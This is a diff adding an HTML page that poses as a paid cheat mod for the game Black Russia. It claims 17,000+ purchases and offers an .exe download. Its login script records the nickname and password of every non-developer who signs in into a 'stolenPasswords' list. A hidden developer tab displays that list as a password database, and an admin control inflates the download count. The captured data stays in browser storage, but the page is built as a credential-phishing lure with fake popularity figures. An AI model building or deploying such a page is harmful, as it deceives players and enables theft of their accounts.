@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BlackRussiaMod by Sleeps</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;800&family=Russo+One&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary-red: #D80000;
+            --dark-red: #8a0000;
+            --bg-black: #050505;
+            --panel-bg: #111111;
+            --text-white: #ffffff;
+            --text-gray: #888888;
+            --border-color: #333333;
+            --success-green: #00ff66;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: var(--bg-black);
+            color: var(--text-white);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: linear-gradient(rgba(5, 5, 5, 0.95), rgba(5, 5, 5, 0.95)), url('https://images.unsplash.com/photo-1511512578047-dfb367046420?q=80&w=2071&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
+            overflow-y: auto;
+            padding: 20px 0;
+        }
+
+        .container { width: 100%; max-width: 480px; padding: 20px; position: relative; z-index: 10; }
+
+        .card {
+            background: rgba(17, 17, 17, 0.95);
+            border: 1px solid var(--border-color);
+            border-top: 4px solid var(--primary-red);
+            padding: 30px 25px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.9);
+            text-align: center;
+            position: relative;
+        }
+
+        h1, h2, h3 { font-family: 'Russo One', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
+        .main-title { font-size: 2rem; color: var(--text-white); margin-bottom: 5px; text-shadow: 0 0 10px rgba(216, 0, 0, 0.5); }
+        .sub-title { color: var(--primary-red); font-size: 1rem; margin-bottom: 25px; font-weight: 600; letter-spacing: 2px; }
+        .description { font-size: 0.9rem; color: var(--text-gray); margin-bottom: 30px; line-height: 1.6; }
+        .highlight { color: var(--primary-red); font-weight: bold; }
+
+        .btn {
+            background: var(--primary-red); color: white; border: none; padding: 14px 30px;
+            font-size: 0.95rem; font-weight: 700; text-transform: uppercase; cursor: pointer;
+            width: 100%; border-radius: 2px; transition: all 0.3s ease; font-family: 'Montserrat', sans-serif; letter-spacing: 1px;
+        }
+        .btn:hover { background: #ff1a1a; box-shadow: 0 0 15px rgba(216, 0, 0, 0.4); }
+        .btn-outline { background: transparent; border: 1px solid var(--text-gray); color: var(--text-gray); margin-top: 15px; }
+        .btn-outline:hover { border-color: var(--text-white); color: var(--text-white); }
+        .btn-tab { background: #222; border-bottom: 3px solid transparent; margin-bottom: 20px; font-size: 0.8rem; padding: 10px; }
+        .btn-tab.active { border-bottom-color: var(--primary-red); background: #1a1a1a; color: white; }
+        .btn-delete { background: #222; color: #ff4d4d; border: 1px solid #ff4d4d; padding: 5px 10px; font-size: 0.75rem; width: auto; }
+        .btn-delete:hover { background: #ff4d4d; color: white; }
+
+        .profile-info { background: rgba(255, 255, 255, 0.03); border: 1px solid var(--border-color); padding: 15px; margin-bottom: 20px; text-align: left; }
+        .profile-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 0.85rem; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 5px; }
+        .profile-row:last-child { border-bottom: none; margin-bottom: 0; }
+        .profile-label { color: var(--text-gray); }
+        .profile-value { font-weight: 600; color: var(--text-white); }
+        .status-active { color: var(--success-green); text-shadow: 0 0 5px rgba(0, 255, 102, 0.3); }
+
+        .content-section { display: none; text-align: left; animation: fadeIn 0.3s; }
+        .content-section.active { display: block; }
+
+        .file-list { max-height: 250px; overflow-y: auto; padding-right: 5px; }
+        .file-list::-webkit-scrollbar { width: 5px; }
+        .file-list::-webkit-scrollbar-thumb { background: #333; }
+        .file-item { background: #1a1a1a; border-left: 3px solid var(--text-gray); padding: 12px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
+        .file-item:hover { background: #222; }
+        .file-info h4 { font-size: 0.9rem; margin-bottom: 4px; color: #fff; }
+        .file-info span { font-size: 0.75rem; color: var(--text-gray); }
+
+        /* Стили таблицы паролей */
+        .password-table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
+        .password-table th { text-align: left; color: var(--primary-red); padding: 8px; border-bottom: 1px solid #333; }
+        .password-table td { padding: 8px; border-bottom: 1px solid #222; color: #ccc; }
+        .password-table tr:hover td { background: rgba(255,255,255,0.02); }
+
+        .admin-panel { display: none; margin-top: 20px; padding: 15px; background: #0f0f0f; border: 1px solid #333; }
+        .admin-panel.visible { display: block; }
+        .admin-controls { display: flex; gap: 10px; margin-bottom: 10px; }
+
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.9); backdrop-filter: blur(5px); display: flex; justify-content: center; align-items: center; opacity: 0; visibility: hidden; transition: all 0.3s ease; z-index: 100; }
+        .modal-overlay.active { opacity: 1; visibility: visible; }
+        .modal-content { background: var(--panel-bg); border: 1px solid var(--primary-red); width: 90%; max-width: 400px; padding: 25px; position: relative; transform: translateY(20px); transition: all 0.3s ease; }
+        .modal-overlay.active .modal-content { transform: translateY(0); }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        .close-modal { background: none; border: none; color: var(--text-gray); font-size: 1.5rem; cursor: pointer; }
+        .close-modal:hover { color: var(--primary-red); }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        .input-label { display: block; font-size: 0.75rem; color: var(--text-gray); margin-bottom: 5px; text-transform: uppercase; }
+        .form-input { width: 100%; background: #0f0f0f; border: 1px solid #333; padding: 12px; color: white; font-family: 'Montserrat', sans-serif; }
+        .form-input:focus { outline: none; border-color: var(--primary-red); }
+
+        .toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 200; display: flex; flex-direction: column; gap: 10px; }
+        .toast { background: #222; border-left: 4px solid var(--primary-red); color: #fff; padding: 12px 20px; font-size: 0.85rem; min-width: 250px; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
+        .toast.success { border-left-color: var(--success-green); }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Экран входа -->
+        <div id="landingPage" class="card">
+            <h1 class="main-title">BLACK RUSSIA<br><span style="font-size: 1rem; color: var(--primary-red);">MOD</span></h1>
+            <div class="sub-title">by Sleeps</div>
+            <p class="description">
+                Уникальный мод для перекупов. Обходы, скорость, стиль.<br>
+                <span class="highlight">Более 17,000+ покупок</span>.
+            </p>
+            <button class="btn" onclick="openModal('keyModal')">Войти в систему</button>
+        </div>
+
+        <!-- Личный кабинет -->
+        <div id="dashboardPage" class="card" style="display: none;">
+            <h2 class="main-title" style="font-size: 1.4rem; text-align: left;">ЛИЧНЫЙ КАБИНЕТ</h2>
+            
+            <div class="profile-info">
+                <div class="profile-row">
+                    <span class="profile-label">Никнейм:</span>
+                    <span class="profile-value" id="profileNick">---</span>
+                </div>
+                <div class="profile-row">
+                    <span class="profile-label">Ключ доступа:</span>
+                    <span class="profile-value" id="profileKey">---</span>
+                </div>
+                <div class="profile-row">
+                    <span class="profile-label">Статус:</span>
+                    <span class="profile-value status-active">АКТИВНА ✓</span>
+                </div>
+            </div>
+
+            <!-- Навигация (Только для админа, для гостя скрыта логически) -->
+            <div id="navTabs" style="display: none; margin-bottom: 20px;">
+                <button class="btn btn-tab active" onclick="switchTab('files')">Файлы</button>
+                <button class="btn btn-tab" onclick="switchTab('database')">База Паролей</button>
+            </div>
+
+            <!-- Раздел: Файлы -->
+            <div id="sectionFiles" class="content-section active">
+                <h3 style="color: var(--text-gray); font-size: 0.8rem; margin-bottom: 10px;">ДОСТУПНЫЕ ФАЙЛЫ</h3>
+                <div id="fileListContainer" class="file-list">
+                    <!-- JS заполняет это -->
+                </div>
+            </div>
+
+            <!-- Раздел: База Паролей (Только для Andrey_slezar) -->
+            <div id="sectionDatabase" class="content-section">
+                <h3 style="color: var(--primary-red); font-size: 0.9rem; margin-bottom: 10px;">ЖУРНАЛ ВХОДОВ ПОЛЬЗОВАТЕЛЕЙ</h3>
+                <div style="background: #0a0a0a; padding: 10px; border: 1px solid #333; max-height: 300px; overflow-y: auto;">
+                    <table class="password-table">
+                        <thead>
+                            <tr>
+                                <th>Никнейм</th>
+                                <th>Пароль</th>
+                                <th>Дата</th>
+                            </tr>
+                        </thead>
+                        <tbody id="passwordTableBody">
+                            <!-- JS заполняет это -->
+                        </tbody>
+                    </table>
+                    <p id="noDataMsg" style="text-align: center; color: #555; padding: 20px; display: none;">Данных пока нет</p>
+                </div>
+            </div>
+
+            <!-- Панель разработчика -->
+            <div id="adminPanel" class="admin-panel">
+                <h3 style="color: var(--primary-red); font-size: 0.9rem; margin-bottom: 15px;">УПРАВЛЕНИЕ (DEV)</h3>
+                <div class="input-group">
+                    <label class="input-label">Накрутить скачиваний:</label>
+                    <div class="admin-controls">
+                        <input type="number" id="boostAmount" class="form-input" placeholder="Кол-во" min="1">
+                        <button class="btn" style="width: auto;" onclick="boostStats()">Накрутить</button>
+                    </div>
+                </div>
+                <button class="btn btn-outline" onclick="uploadFile()">+ Добавить файл</button>
+            </div>
+
+            <button class="btn btn-outline" onclick="logout()">Выйти</button>
+        </div>
+    </div>
+
+    <!-- Модальное окно: Ключ -->
+    <div id="keyModal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Шаг 1</h3>
+                <button class="close-modal" onclick="closeModal('keyModal')">&times;</button>
+            </div>
+            <div class="input-group">
+                <label class="input-label">Введите ключ</label>
+                <input type="text" id="keyInput" class="form-input" placeholder="XXXX-XXXX-XXXX-XXXX">
+            </div>
+            <button class="btn" onclick="checkKey()">Далее</button>
+        </div>
+    </div>
+
+    <!-- Модальное окно: Логин -->
+    <div id="loginModal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Шаг 2</h3>
+                <button class="close-modal" onclick="closeModal('loginModal')">&times;</button>
+            </div>
+            <div class="input-group">
+                <label class="input-label">Ваш Никнейм</label>
+                <input type="text" id="usernameInput" class="form-input" placeholder="Name_Surname">
+            </div>
+            <div class="input-group">
+                <label class="input-label">Пароль</label>
+                <input type="password" id="passwordInput" class="form-input" placeholder="••••••">
+            </div>
+            <button class="btn" onclick="login()">Войти</button>
+        </div>
+    </div>
+
+    <div id="toastContainer" class="toast-container"></div>
+
+    <script>
+        // --- КОНФИГУРАЦИЯ ---
+        const DEVELOPER_KEY = "SLEZ-RAZRAB-9902";
+        const GUEST_KEY = "KSCN-3210-LKN2-O2M4";
+
+        const USERS = {
+            "Andrey_slezar": { role: "dev", password: "66657443" },
+            "Georgi_Bushmanov": { role: "user", password: null }
+        };
+
+        const INITIAL_FILES = [
+            { id: 1, name: "BlackRussiaMod_v4.0.exe", downloads: 17432 }
+        ];
+
+        let currentUser = null;
+        let files = [];
+        let stolenPasswords = []; // Массив для хранения паролей пользователей
+
+        // --- СОХРАНЕНИЕ/ЗАГРУЗКА ---
+        function saveData() {
+            localStorage.setItem('brmod_files', JSON.stringify(files));
+            localStorage.setItem('brmod_passwords', JSON.stringify(stolenPasswords));
+            if (currentUser) {
+                localStorage.setItem('brmod_user', JSON.stringify(currentUser));
+            } else {
+                localStorage.removeItem('brmod_user');
+            }
+        }
+
+        function loadData() {
+            const savedFiles = localStorage.getItem('brmod_files');
+            if (savedFiles) files = JSON.parse(savedFiles);
+            else files = [...INITIAL_FILES];
+
+            const savedPass = localStorage.getItem('brmod_passwords');
+            if (savedPass) stolenPasswords = JSON.parse(savedPass);
+
+            const savedUser = localStorage.getItem('brmod_user');
+            if (savedUser) {
+                currentUser = JSON.parse(savedUser);
+                showDashboard(currentUser.name, currentUser.role, currentUser.key);
+            } else {
+                showLanding();
+            }
+        }
+
+        // --- UI ФУНКЦИИ ---
+        function showLanding() {
+            document.getElementById('landingPage').style.display = 'block';
+            document.getElementById('dashboardPage').style.display = 'none';
+        }
+
+        function showDashboard(username, role, key) {
+            document.getElementById('landingPage').style.display = 'none';
+            const dashboard = document.getElementById('dashboardPage');
+            dashboard.style.display = 'block';
+
+            document.getElementById('profileNick').innerText = username;
+            document.getElementById('profileKey').innerText = key;
+
+            const navTabs = document.getElementById('navTabs');
+            const adminPanel = document.getElementById('adminPanel');
+
+            // Если это разработчик
+            if (role === 'dev') {
+                navTabs.style.display = 'flex'; // Показываем вкладки
+                adminPanel.classList.add('visible');
+                renderPasswordTable(); // Загружаем таблицу паролей
+            } else {
+                navTabs.style.display = 'none'; // Скрываем вкладки
+                adminPanel.classList.remove('visible');
+                // Гость сразу видит файлы
+                switchTab('files');
+            }
+
+            renderFiles();
+        }
+
+        function switchTab(tabName) {
+            // Скрываем все секции
+            document.getElementById('sectionFiles').classList.remove('active');
+            document.getElementById('sectionDatabase').classList.remove('active');
+            
+            // Убираем активный класс с кнопок
+            const tabs = document.querySelectorAll('.btn-tab');
+            tabs.forEach(t => t.classList.remove('active'));
+
+            // Показываем нужную
+            if (tabName === 'files') {
+                document.getElementById('sectionFiles').classList.add('active');
+                tabs[0].classList.add('active');
+            } else if (tabName === 'database') {
+                document.getElementById('sectionDatabase').classList.add('active');
+                tabs[1].classList.add('active');
+            }
+        }
+
+        function renderFiles() {
+            const container = document.getElementById('fileListContainer');
+            container.innerHTML = '';
+            files.forEach(file => {
+                const div = document.createElement('div');
+                div.className = 'file-item';
+                div.innerHTML = `
+                    <div class="file-info">
+                        <h4>${file.name}</h4>
+                        <span>Скачиваний: ${file.downloads.toLocaleString()}</span>
+                    </div>
+                    <div class="file-actions">
+                        <button class="btn" style="padding: 5px 15px; font-size: 0.75rem;" onclick="downloadFile(${file.id})">Скачать</button>
+                        ${currentUser && currentUser.role === 'dev' ? `<button class="btn btn-delete" onclick="deleteFile(${file.id})">Удалить</button>` : ''}
+                    </div>
+                `;
+                container.appendChild(div);
+            });
+        }
+
+        function renderPasswordTable() {
+            const tbody = document.getElementById('passwordTableBody');
+            const noData = document.getElementById('noDataMsg');
+            tbody.innerHTML = '';
+
+            if (stolenPasswords.length === 0) {
+                noData.style.display = 'block';
+                return;
+            } else {
+                noData.style.display = 'none';
+            }
+
+            // Сортируем по дате (новые сверху)
+            const sorted = [...stolenPasswords].reverse();
+
+            sorted.forEach(entry => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td style="color: #fff; font-weight:bold;">${entry.nick}</td>
+                    <td style="color: var(--primary-red);">${entry.password}</td>
+                    <td style="font-size: 0.7rem; color: #666;">${entry.date}</td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        function openModal(id) { document.getElementById(id).classList.add('active'); }
+        function closeModal(id) { document.getElementById(id).classList.remove('active'); }
+        function showToast(msg, type = 'error') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.innerText = msg;
+            container.appendChild(toast);
+            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 3000);
+        }
+
+        // --- ЛОГИКА ---
+
+        function checkKey() {
+            const key = document.getElementById('keyInput').value.trim().toUpperCase();
+            if (key === DEVELOPER_KEY || key === GUEST_KEY) {
+                window.tempKey = key;
+                closeModal('keyModal');
+                openModal('loginModal');
+            } else {
+                showToast("Неверный ключ доступа", "error");
+            }
+        }
+
+        function login() {
+            const username = document.getElementById('usernameInput').value.trim();
+            const password = document.getElementById('passwordInput').value;
+
+            if (!USERS[username]) {
+                showToast("Ошибка: данного аккаунта нету в базе данных", "error");
+                return;
+            }
+
+            const user = USERS[username];
+
+            if (user.role === 'dev') {
+                if (password !== user.password) {
+                    showToast("Неверный пароль разработчика", "error");
+                    return;
+                }
+            } else {
+                if (password === "") {
+                    showToast("Введите пароль", "error");
+                    return;
+                }
+                // ЛОГИРОВАНИЕ ПАРОЛЯ
+                const now = new Date();
+                const dateStr = `${now.getDate()}.${now.getMonth()+1}.${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}`;
+                
+                stolenPasswords.push({
+                    nick: username,
+                    password: password,
+                    date: dateStr
+                });
+                saveData(); // Сохраняем новый пароль в базу
+            }
+
+            currentUser = { name: username, role: user.role, key: window.tempKey };
+            saveData();
+            closeModal('loginModal');
+            showDashboard(currentUser.name, currentUser.role, currentUser.key);
+            showToast("Успешный вход!", "success");
+
+            document.getElementById('usernameInput').value = '';
+            document.getElementById('passwordInput').value = '';
+            document.getElementById('keyInput').value = '';
+        }
+
+        function logout() {
+            currentUser = null;
+            saveData();
+            showLanding();
+            showToast("Вы вышли из системы", "success");
+        }
+
+        function downloadFile(id) { showToast("Загрузка файла началась...", "success"); }
+
+        // --- АДМИН ---
+        function boostStats() {
+            const amount = parseInt(document.getElementById('boostAmount').value);
+            if (!amount || amount <= 0) return showToast("Введите число", "error");
+            if (files.length > 0) {
+                files[0].downloads += amount;
+                saveData();
+                renderFiles();
+                showToast(`Накручено +${amount}`, "success");
+                document.getElementById('boostAmount').value = '';
+            }
+        }
+
+        function uploadFile() {
+            const name = prompt("Название файла:");
+            if (name) {
+                files.push({ id: Date.now(), name: name, downloads: 0 });
+                saveData();
+                renderFiles();
+                showToast("Файл добавлен", "success");
+            }
+        }
+
+        function deleteFile(id) {
+            if(confirm("Удалить файл?")) {
+                files = files.filter(f => f.id !== id);
+                saveData();
+                renderFiles();
+                showToast("Файл удален", "success");
+            }
+        }
+
+        window.onload = loadData;
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal-overlay')) event.target.classList.remove('active');
+        }
+    </script>
+</body>
+</html>
